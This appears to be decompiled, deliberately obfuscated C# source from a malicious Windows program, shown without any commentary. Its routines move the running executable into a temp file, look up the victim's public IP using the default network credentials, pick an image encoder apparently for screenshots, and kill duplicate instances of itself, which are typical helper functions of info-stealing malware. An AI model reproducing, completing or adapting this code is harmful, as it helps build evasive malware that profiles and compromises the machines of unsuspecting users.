using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Windows.Forms;
using ppkr;

namespace q9Ep;

public static class FZ9K2n1R
{
	public static void jrnkL2l7y(string _6cOh)
	{
		int num = 0;
		string location = default;
		while (true)
		{
			if (num == 1)
			{
				location = Assembly.GetExecutingAssembly().Location;
				num = 2;
			}
			if (num == 2)
			{
				if (!(location != _6cOh))
				{
					break;
				}
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num != 3)
			{
				continue;
			}
			try
			{
				gVe3wBP.MoveFile(_2f5qwHD5D(Application.ExecutablePath, gVe3wBP.GetModuleFileName(0, Application.ExecutablePath, 256)), Path.GetTempPath() + "\\G" + DateTime.Now.Millisecond + ".tmp", 8L);
				break;
			}
			catch
			{
				break;
			}
		}
	}

	private static string _2f5qwHD5D(string _6gUDu, int LgEv1vRC)
	{
		int num = 0;
		do
		{
			if (num == 6)
			{
				goto IL_001f;
			}
			if (num == 4)
			{
				goto IL_004c;
			}
			if (num == 3)
			{
				if (_6gUDu.Length != 0)
				{
					goto IL_00df;
				}
				num = 4;
			}
			if (num == 1)
			{
				if (LgEv1vRC < 0)
				{
					break;
				}
				num = 2;
			}
			if (num == 2)
			{
				if (LgEv1vRC == 0)
				{
					goto IL_004c;
				}
				num = 3;
			}
			switch (num)
			{
			case 5:
				break;
			case 0:
				num = 1;
				continue;
			default:
				continue;
			}
			goto IL_00df;
			IL_004c:
			return "";
			IL_001f:
			return _6gUDu.Substring(0, LgEv1vRC);
			IL_00df:
			if (_6gUDu.Length <= LgEv1vRC)
			{
				return _6gUDu;
			}
			goto IL_001f;
		}
		while (num != 7);
		return "";
	}

	public static string Px9zU143g()
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(dBDNalx6.IpApi);
			httpWebRequest.Credentials = CredentialCache.DefaultCredentials;
			httpWebRequest.KeepAlive = true;
			httpWebRequest.Timeout = 10000;
			httpWebRequest.AllowAutoRedirect = true;
			httpWebRequest.MaximumAutomaticRedirections = 50;
			httpWebRequest.Method = "GET";
			httpWebRequest.UserAgent = dBDNalx6.PublicUserAgent;
			using (WebResponse webResponse = httpWebRequest.GetResponse())
			{
				if (((HttpWebResponse)webResponse).StatusDescription == "OK")
				{
					using (Stream stream = webResponse.GetResponseStream())
					{
						StreamReader streamReader = new StreamReader(stream);
						return streamReader.ReadToEnd();
					}
				}
			}
			return "";
		}
		catch
		{
			return "";
		}
	}

	public static IList<T> sOtdofw<T>(IList<T> TPWQ4Ehu)
	{
		int num = 0;
		int num2 = default;
		T value = default;
		byte[] array = default;
		int index = default;
		RNGCryptoServiceProvider rNGCryptoServiceProvider = default;
		do
		{
			if (num == 8)
			{
				num2--;
				num = 9;
			}
			if (num == 11)
			{
				TPWQ4Ehu[num2] = value;
				num = 12;
			}
			if (num == 12)
			{
				goto IL_0072;
			}
			goto IL_0089;
			IL_01ce:
			array = new byte[1];
			num = 5;
			goto IL_01e5;
			IL_0072:
			if (num2 <= 1)
			{
				num = 13;
				goto IL_0089;
			}
			goto IL_01ce;
			IL_00ef:
			if (num == 7)
			{
				index = array[0] % num2;
				num = 8;
			}
			if (num == 3)
			{
				goto IL_0072;
			}
			if (num == 10)
			{
				TPWQ4Ehu[index] = TPWQ4Ehu[num2];
				num = 11;
			}
			if (num == 1)
			{
				rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
				num = 2;
			}
			if (num == 9)
			{
				value = TPWQ4Ehu[index];
				num = 10;
			}
			if (num == 4)
			{
				goto IL_01ce;
			}
			goto IL_01e5;
			IL_00d9:
			rNGCryptoServiceProvider.GetBytes(array);
			num = 6;
			goto IL_00ef;
			IL_0089:
			if (num == 6)
			{
				if (!((double)(int)array[0] < (double)num2 * (255.0 / (double)num2)))
				{
					goto IL_00d9;
				}
				num = 7;
			}
			if (num == 5)
			{
				goto IL_00d9;
			}
			goto IL_00ef;
			IL_01e5:
			if (num == 2)
			{
				num2 = TPWQ4Ehu.Count;
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 13);
		return TPWQ4Ehu;
	}

	public static ImageCodecInfo Kw2HO39hTDF(ImageFormat ZBmyjCZcC)
	{
		int num = 0;
		int num2 = default;
		ImageCodecInfo[] imageEncoders = default;
		while (true)
		{
			if (num == 2)
			{
				num2 = 0;
				num = 3;
			}
			if (num == 3)
			{
				goto IL_0116;
			}
			if (num == 4)
			{
				goto IL_0061;
			}
			goto IL_008b;
			IL_0061:
			if (imageEncoders[num2].FormatID == ZBmyjCZcC.Guid)
			{
				num = 5;
				goto IL_008b;
			}
			goto IL_0108;
			IL_0108:
			num2++;
			goto IL_0116;
			IL_0116:
			if (num2 >= imageEncoders.Length)
			{
				break;
			}
			goto IL_0061;
			IL_008b:
			switch (num)
			{
			case 5:
				return imageEncoders[num2];
			case 1:
				imageEncoders = ImageCodecInfo.GetImageEncoders();
				num = 2;
				break;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num == 6)
			{
				goto IL_0108;
			}
		}
		return null;
	}

	public static void PFL7xV()
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			string processName = Process.GetCurrentProcess().ProcessName;
			int id = Process.GetCurrentProcess().Id;
			Process[] processesByName = Process.GetProcessesByName(processName);
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				if (process.Id != id)
				{
					process.Kill();
				}
			}
		}
		catch
		{
		}
	}
}
